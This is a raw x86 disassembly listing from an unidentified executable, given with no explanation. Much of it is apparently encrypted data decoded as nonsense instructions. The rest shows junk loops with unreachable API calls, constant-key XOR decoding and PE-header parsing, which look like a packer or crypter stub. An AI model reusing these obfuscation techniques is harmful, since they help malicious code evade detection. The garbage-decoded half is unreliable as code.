  413743:	sbb    dh,BYTE PTR [esi+ebx*8+0x51]
  413747:	push   esp
  413748:	pop    ss
  413749:	or     al,0x99
  41374b:	jmp    0x4136fd
  41374d:	js     0x413713
  41374f:	ror    esp,0xb
  413752:	ret    0x3b39
  413755:	mov    bl,0xe4
  413757:	fwait
  413758:	call   0xcfe1e78a
  41375d:	inc    edi
  41375e:	in     al,0xf6
  413760:	call   0x55f4a4a2
  413765:	cmp    al,bh
  413767:	repz pop eax
  413769:	mov    BYTE PTR ds:0x43d54b09,cl
  41376f:	xchg   esi,esp
  413771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413772:	shl    DWORD PTR [esi-0x2c],1
  413775:	xor    al,dh
  413777:	fcom   DWORD PTR [ecx-0x18b86748]
  41377d:	jmp    0x7664:0x34ce0bf2
  413784:	enter  0x9d47,0x8
  413788:	push   ss
  413789:	push   ecx
  41378a:	mov    BYTE PTR [esi+0x4b],dl
  41378d:	shl    BYTE PTR [edi-0x44],cl
  413790:	fwait
  413791:	or     al,0x93
  413793:	and    al,0xae
  413795:	add    dl,ah
  413797:	jno    0x413763
  413799:	xchg   ebp,eax
  41379a:	fnstenv [eax+0x5c]
  41379d:	mov    al,0xf8
  41379f:	inc    esp
  4137a0:	cmc    
  4137a1:	xor    BYTE PTR ds:[ebx-0x48],0x10
  4137a6:	push   ecx
  4137a7:	(bad)  
  4137a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137a9:	jmp    0x94d2503c
  4137ae:	dec    edx
  4137af:	stc    
  4137b0:	push   0x4dc294b5
  4137b5:	xchg   ebp,eax
  4137b6:	add    DWORD PTR [edx+0xf4fcf5c],ebx
  4137bc:	inc    DWORD PTR [ebx+eiz*8-0x711f864e]
  4137c3:	mov    al,ds:0x43c17b14
  4137c8:	sub    BYTE PTR [edi-0x4807d6ad],ch
  4137ce:	dec    edx
  4137cf:	mov    al,ds:0xf41d0a03
  4137d4:	les    eax,FWORD PTR [edi-0x74]
  4137d7:	and    BYTE PTR [edi*1+0x6ffd62dc],dl
  4137de:	mov    ebp,0xd74667c7
  4137e3:	dec    eax
  4137e4:	ja     0x4137cb
  4137e6:	mov    edx,0x9d48ba47
  4137eb:	sbb    DWORD PTR [ebx],edx
  4137ed:	adc    esi,ebp
  4137ef:	arpl   WORD PTR [edx+0x2983ec2c],si
  4137f5:	test   al,0x5b
  4137f7:	daa    
  4137f8:	mov    dl,0xf8
  4137fa:	add    BYTE PTR [ecx+esi*4],dl
  4137fd:	out    dx,al
  4137fe:	mov    ds:0x3298cee9,eax
  413803:	je     0x4137f8
  413805:	or     BYTE PTR [eax+edx*8],bl
  413808:	mov    ds:0x936be9f,eax
  41380d:	sti    
  41380e:	or     bl,al
  413810:	mov    ds,esi
  413812:	mov    edx,0x351f9bee
  413817:	gs dec esi
  413819:	cmp    ebx,DWORD PTR [edi-0x2f]
  41381c:	sbb    al,0x5f
  41381e:	dec    ebx
  41381f:	jge    0x4137c7
  413821:	cmp    eax,0x11f25b3
  413826:	and    al,0x60
  413828:	push   eax
  413829:	repnz mov DWORD PTR [eax-0x1aa05803],eax
  413830:	or     eax,0xdeecee99
  413835:	cmp    esp,ebx
  413837:	pop    ecx
  413838:	push   cs
  413839:	xchg   BYTE PTR [ecx+ebx*4-0xa30644f],dh
  413840:	dec    edx
  413841:	imul   ecx,DWORD PTR [eax+edx*4-0x71ad313e],0xcd04f72c
  41384c:	lds    ebp,FWORD PTR ds:0x6a5e431c
  413852:	sbb    al,0x31
  413854:	push   0xce74562
  413859:	xor    eax,0xe3baa6e5
  41385e:	push   0xfffffff9
  413860:	push   esi
  413861:	pop    ds
  413862:	fistp  QWORD PTR [edi+0x58f1a30c]
  413868:	pop    ebx
  413869:	out    0x83,eax
  41386b:	dec    esp
  41386c:	and    BYTE PTR [edi+edx*2],bh
  41386f:	retf   0x449a
  413872:	xchg   ecx,eax
  413873:	or     esp,DWORD PTR [eax+0x79f01317]
  413879:	jo     0x4138e4
  41387b:	xor    al,0x4c
  41387d:	pop    eax
  41387e:	xor    cl,BYTE PTR [esp+esi*8-0x3]
  413882:	loopne 0x413861
  413884:	xchg   edx,eax
  413885:	inc    edi
  413886:	mov    bh,0xf3
  413888:	push   edx
  413889:	aaa    
  41388a:	mov    bl,0x3d
  41388c:	cmp    bh,BYTE PTR [eax]
  41388e:	and    ecx,DWORD PTR [eax+0x60]
  413891:	popf   
  413892:	pop    ebx
  413893:	pand   mm2,QWORD PTR [eax+0x8]
  413897:	icebp  
  413898:	je     0x413871
  41389a:	fisubr DWORD PTR [eax]
  41389c:	cmc    
  41389d:	sub    eax,eax
  41389f:	xor    bh,BYTE PTR [ebx+0x0]
  4138a2:	sub    eax,0x8395b8db
  4138a7:	sub    dh,bl
  4138a9:	(bad)  
  4138aa:	xchg   edx,eax
  4138ab:	cmp    bl,BYTE PTR [ecx+0x47]
  4138ae:	outs   dx,BYTE PTR ds:[esi]
  4138af:	sahf   
  4138b0:	mov    edi,0x3879b3d9
  4138b5:	xchg   ebx,eax
  4138b6:	mov    bh,0xe8
  4138b8:	adc    dh,BYTE PTR [ebx+0x4961bd45]
  4138be:	jb     0x413907
  4138c0:	and    BYTE PTR [edx-0x42],bh
  4138c3:	or     DWORD PTR [edi+edx*2+0x4250dc15],eax
  4138ca:	adc    bh,ah
  4138cc:	push   esp
  4138cd:	push   esp
  4138ce:	add    bh,BYTE PTR [eax-0x207084a2]
  4138d4:	lods   eax,DWORD PTR ds:[si]
  4138d6:	jle    0x4138d8
  4138d8:	and    esp,DWORD PTR [edx-0x6c]
  4138db:	inc    ebx
  4138dc:	(bad)  
  4138dd:	xor    BYTE PTR gs:[ebx],0x48
  4138e1:	pusha  
  4138e2:	push   ecx
  4138e3:	and    bl,cl
  4138e5:	leave  
  4138e6:	lods   eax,DWORD PTR ds:[esi]
  4138e7:	aas    
  4138e8:	out    0x78,eax
  4138ea:	push   ds
  4138eb:	ds or  al,0xdb
  4138ee:	shl    DWORD PTR [edx+0x3be9b391],0x85
  4138f5:	or     DWORD PTR [ebx+ebx*1-0x6ea80a5b],esi
  4138fc:	cmp    BYTE PTR [edi+eax*4+0x6c],dh
  413900:	outs   dx,DWORD PTR ds:[esi]
  413901:	es push edx
  413903:	lods   eax,DWORD PTR ds:[esi]
  413904:	pop    eax
  413905:	pop    esi
  413906:	aad    0xb1
  413908:	add    DWORD PTR [edi-0x6f],edi
  41390b:	add    cl,dh
  41390d:	jb     0x4138ba
  41390f:	scas   al,BYTE PTR es:[edi]
  413910:	push   esi
  413911:	test   eax,0x7dd0cd08
  413916:	lods   eax,DWORD PTR ds:[esi]
  413917:	inc    edi
  413918:	xor    ah,ah
  41391a:	jne    0x41393d
  41391c:	mov    edx,0x31d71fac
  413921:	mov    ?,WORD PTR [ecx+0x4d]
  413924:	cli    
  413925:	int    0xd
  413927:	ja     0x41394a
  413929:	jecxz  0x413954
  41392b:	pop    ds
  41392c:	xchg   ecx,eax
  41392d:	lds    ecx,FWORD PTR [esi]
  41392f:	das    
  413930:	and    al,0x4f
  413932:	add    ah,dh
  413934:	sub    BYTE PTR [edx+0x44],0x43
  413938:	xchg   BYTE PTR [edi-0x56f0415d],al
  41393e:	imul   edx,DWORD PTR [esi+0x7ba3a787],0x12
  413945:	out    0x96,al
  413947:	sbb    eax,0x8f412580
  41394c:	mov    dl,0x1f
  41394e:	enter  0x65db,0x71
  413952:	into   
  413953:	or     eax,0x89016b6d
  413958:	test   eax,ebp
  41395a:	mov    BYTE PTR cs:[edi],0x5b
  41395e:	(bad)  
  41395f:	test   DWORD PTR [esi+0x20ad7f2],ebp
  413965:	add    al,0x17
  413967:	mov    eax,ds:0x9401f950
  41396c:	push   ds
  41396d:	imul   ecx,DWORD PTR [ecx+edx*4-0x64],0xfcbe3e55
  413975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413976:	sbb    dh,al
  413978:	jmp    0xff90:0x9bcd9022
  41397f:	sbb    BYTE PTR ds:0xc19ecec0,dl
  413985:	enterw 0xdf40,0x52
  41398a:	fadd   DWORD PTR [ebx]
  41398c:	sbb    edi,DWORD PTR ss:[esi+0x2c]
  413990:	call   0x1feb:0x741aa881
  413997:	clc    
  413998:	mov    bh,0x74
  41399a:	xchg   ebp,eax
  41399b:	sub    esi,edi
  41399d:	adc    BYTE PTR [ecx],0xa2
  4139a0:	mov    BYTE PTR [edi-0x7b],ch
  4139a3:	fwait
  4139a4:	outs   dx,BYTE PTR ds:[esi]
  4139a5:	mov    bh,0xa1
  4139a7:	mov    ebx,0x1b54929
  4139ac:	adc    al,0x33
  4139ae:	mov    eax,0x3fc9363e
  4139b3:	dec    eax
  4139b4:	loop   0x41396f
  4139b6:	pop    edi
  4139b7:	xchg   edx,eax
  4139b8:	out    0xed,eax
  4139ba:	mov    dl,bh
  4139bc:	xor    BYTE PTR [edx-0x689911d7],dh
  4139c2:	cli    
  4139c3:	cli    
  4139c4:	push   ss
  4139c5:	ret    
  4139c6:	jp     0x413a18
  4139c8:	stos   BYTE PTR es:[edi],al
  4139c9:	xor    ebp,DWORD PTR [esi-0x8db3c3d]
  4139cf:	les    ebx,FWORD PTR [ecx]
  4139d1:	sub    al,0xce
  4139d3:	fisub  DWORD PTR [ecx+0x537d9716]
  4139d9:	dec    edi
  4139da:	and    BYTE PTR [ecx-0x27],al
  4139dd:	xor    al,0x9a
  4139df:	sbb    dh,BYTE PTR [ebx]
  4139e1:	fldcw  WORD PTR [esi]
  4139e3:	sti    
  4139e4:	rdmsr  
  4139e6:	cmp    DWORD PTR [eax-0x1826435c],ecx
  4139ec:	mov    dh,0xe3
  4139ee:	ror    BYTE PTR [eax-0x49f8d190],0xa2
  4139f5:	xor    eax,0x632ef174
  4139fa:	cli    
  4139fb:	xlat   BYTE PTR ds:[ebx]
  4139fc:	xor    bh,ah
  4139fe:	adc    ebx,DWORD PTR [edx]
  413a00:	adc    edx,DWORD PTR [edx]
  413a02:	add    ecx,esi
  413a04:	xor    DWORD PTR [ecx-0x74],edi
  413a07:	xchg   ah,bl
  413a09:	(bad)  
  413a0a:	out    0xec,eax
  413a0c:	adc    eax,0x515e53e8
  413a11:	pop    edi
  413a12:	jp     0x413a17
  413a14:	sbb    BYTE PTR [ebx+0x52],0xd3
  413a18:	add    BYTE PTR [ebp+0x258eb43],bl
  413a1e:	fs ret 0x8e15
  413a22:	ret    0x8f1e
  413a25:	sbb    edx,esp
  413a27:	out    0xa4,al
  413a29:	mov    BYTE PTR [ebx],al
  413a2b:	cmp    DWORD PTR [esi-0x350be524],eax
  413a31:	fs dec ecx
  413a33:	xor    ecx,DWORD PTR [edi-0x1ef6862]
  413a39:	loope  0x413a2c
  413a3b:	sub    BYTE PTR [ebx+eax*1-0x6f],0x86
  413a40:	adc    eax,0x30a52211
  413a45:	jp     0x413a0c
  413a47:	pop    ebp
  413a48:	js     0x413a34
  413a4a:	fs jb  0x413a44
  413a4d:	xchg   esi,eax
  413a4e:	xchg   DWORD PTR [ebx+0x24d1be3a],esi
  413a54:	sbb    edx,DWORD PTR [ebp+0x16]
  413a57:	jg     0x4139e3
  413a59:	jno    0x413a7e
  413a5b:	(bad)  
  413a5c:	mov    ecx,0xf06c0933
  413a61:	loop   0x413a56
  413a63:	les    ebp,FWORD PTR [eax+0x9b9d653]
  413a69:	nop
  413a6a:	cmp    al,0x22
  413a6c:	inc    edi
  413a6d:	push   esi
  413a6e:	std    
  413a6f:	add    eax,0x3d539d23
  413a74:	sub    DWORD PTR ds:0xf318f1b8,ecx
  413a7a:	fwait
  413a7b:	xor    DWORD PTR [ebp-0x2673586e],esi
  413a81:	jns    0x413adb
  413a83:	mov    al,BYTE PTR [edi]
  413a85:	es jmp 0xa436:0xc8ec2c36
  413a8d:	add    cl,al
  413a8f:	test   BYTE PTR [edx+0x30],dh
  413a92:	or     dh,BYTE PTR [eax]
  413a94:	and    al,0x17
  413a96:	(bad)  
  413a97:	push   esp
  413a98:	fstp   TBYTE PTR [edx-0xb]
  413a9b:	cdq    
  413a9c:	sti    
  413a9d:	push   ss
  413a9e:	call   0x9031174
  413aa3:	mov    esi,0x369f416a
  413aa8:	addr16 data16 fucomi st,st(0)
  413aad:	mov    edi,0x304ea341
  413ab2:	pop    eax
  413ab3:	xlat   BYTE PTR ds:[ebx]
  413ab4:	fimul  WORD PTR [ecx+ebx*1]
  413ab7:	fcomi  st,st(6)
  413ab9:	push   cs
  413aba:	(bad)  
  413abb:	sbb    eax,0x2ba2dbf3
  413ac0:	fdivr  st(6),st
  413ac2:	(bad)  
  413ac3:	cmp    ch,bh
  413ac5:	ficomp WORD PTR [eax-0x2a]
  413ac8:	and    esi,esi
  413aca:	int    0xaa
  413acc:	sbb    BYTE PTR [esi],dh
  413ace:	les    ebp,FWORD PTR [esi-0x2d]
  413ad1:	dec    ebp
  413ad2:	or     cl,dl
  413ad4:	and    DWORD PTR [eax+0x3000019b],0x8efbf2b0
  413ade:	cmp    al,0x40
  413ae0:	enter  0x9908,0x58
  413ae4:	push   0x18
  413ae6:	xchg   ebx,eax
  413ae7:	popa   
  413ae8:	push   cs
  413ae9:	mov    ebx,0x6934b6d8
  413aee:	mov    ebp,0x6654bfc1
  413af3:	inc    ebx
  413af4:	out    0x56,al
  413af6:	xchg   ebp,eax
  413af7:	test   DWORD PTR [esi+0x55],eax
  413afa:	xchg   edi,eax
  413afb:	xlat   BYTE PTR ds:[ebx]
  413afc:	div    BYTE PTR [edi-0x28]
  413aff:	adc    BYTE PTR [ecx+edi*4-0x73],al
  413b03:	daa    
  413b04:	stos   BYTE PTR es:[edi],al
  413b05:	cmp    ebx,DWORD PTR [ecx+edi*8]
  413b08:	cmp    BYTE PTR [edi-0x10],bh
  413b0b:	sbb    esp,esp
  413b0d:	test   eax,0x6ae78d87
  413b12:	aad    0xa0
  413b14:	test   al,0xc
  413b16:	mov    ch,0x72
  413b18:	pop    ss
  413b19:	and    eax,0xd2fef2fb
  413b1e:	pusha  
  413b1f:	pop    edx
  413b20:	(bad)  
  413b21:	adc    ebx,ebx
  413b23:	pop    ebx
  413b24:	dec    ebp
  413b25:	dec    edi
  413b26:	sbb    BYTE PTR [ebp+0x103de65b],bh
  413b2c:	inc    esp
  413b2d:	repnz mov BYTE PTR [esi+ebp*2],0xa8
  413b32:	inc    edi
  413b33:	aaa    
  413b34:	mov    dl,0x98
  413b36:	pop    eax
  413b37:	lea    edi,ds:0xf5c0d1da
  413b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b3e:	xchg   ebx,eax
  413b3f:	pop    ds
  413b40:	lods   al,BYTE PTR ds:[esi]
  413b41:	imul   ecx,DWORD PTR [ebx+0x23],0x12
  413b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b46:	int    0x6
  413b48:	repz (bad) [ebp-0x454270d8]
  413b4f:	int    0x73
  413b51:	mov    eax,edx
  413b53:	sub    esp,DWORD PTR [esi]
  413b55:	(bad)  
  413b56:	pop    esp
  413b57:	mov    ds:0x2ba9e3ba,al
  413b5c:	add    DWORD PTR [edx-0x3e],0x6f
  413b60:	add    dh,BYTE PTR [edi]
  413b62:	into   
  413b63:	or     eax,0x5313564c
  413b68:	sbb    eax,0xc9d3d9b8
  413b6d:	xor    al,0x22
  413b6f:	outs   dx,BYTE PTR ds:[esi]
  413b70:	xchg   ebx,eax
  413b71:	cmp    BYTE PTR [edx-0x70],0x30
  413b75:	dec    ebx
  413b76:	sub    BYTE PTR [edx],al
  413b78:	pop    es
  413b79:	add    bl,BYTE PTR [esi-0x1d1e00d8]
  413b7f:	icebp  
  413b80:	or     al,0x4
  413b82:	dec    ebx
  413b83:	sub    dl,bl
  413b85:	sub    bh,BYTE PTR [esp+eiz*2-0x4d]
  413b89:	(bad)  
  413b8a:	lods   al,BYTE PTR ds:[esi]
  413b8b:	fwait
  413b8c:	lods   al,BYTE PTR ds:[esi]
  413b8d:	jne    0x413b57
  413b8f:	or     BYTE PTR [ebx+edx*4],bl
  413b92:	aas    
  413b93:	pop    esi
  413b94:	pop    ebp
  413b95:	lahf   
  413b96:	sub    BYTE PTR [esi],bl
  413b98:	popf   
  413b99:	popf   
  413b9a:	outs   dx,DWORD PTR ds:[esi]
  413b9b:	sbb    BYTE PTR [eax],dl
  413b9d:	scas   al,BYTE PTR es:[edi]
  413b9e:	or     BYTE PTR [ebx+0x63],ah
  413ba1:	mov    al,0x51
  413ba3:	repz sub al,0xfd
  413ba6:	out    dx,al
  413ba7:	or     ch,dl
  413ba9:	je     0x413b76
  413bab:	pop    ebp
  413bac:	sbb    al,0xb0
  413bae:	sbb    cl,bh
  413bb0:	pushf  
  413bb1:	addr16 jbe 0x413c25
  413bb4:	fs mov edi,0x7dffa113
  413bba:	aaa    
  413bbb:	loop   0x413bb2
  413bbd:	jns    0x413c1a
  413bbf:	xchg   DWORD PTR [si],eax
  413bc2:	outs   dx,DWORD PTR ds:[esi]
  413bc3:	mov    bh,0xd2
  413bc5:	frstor [ecx-0x58]
  413bc8:	or     eax,0x55a482c5
  413bcd:	imul   edx,DWORD PTR [esi],0xd
  413bd0:	inc    eax
  413bd1:	mov    al,ds:0x14f8e4ee
  413bd6:	add    BYTE PTR [edi+ebp*4+0x55],cl
  413bda:	das    
  413bdb:	inc    edi
  413bdc:	xchg   esi,eax
  413bdd:	pop    ss
  413bde:	cli    
  413bdf:	jns    0x413c4b
  413be1:	xor    cl,bl
  413be3:	dec    esi
  413be4:	cdq    
  413be5:	aas    
  413be6:	retf   
  413be7:	fs add dx,cx
  413beb:	adc    edi,0xffffffff
  413bee:	xor    edx,eax
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421cb2
  413c08:	mov    ds:0x421cba,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421a82
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x4238c8
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a4e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x4238e3
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x4239a6
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a46
  413f9e:	mov    eax,ds:0x421a56
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421aae
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c36
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x423a20
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
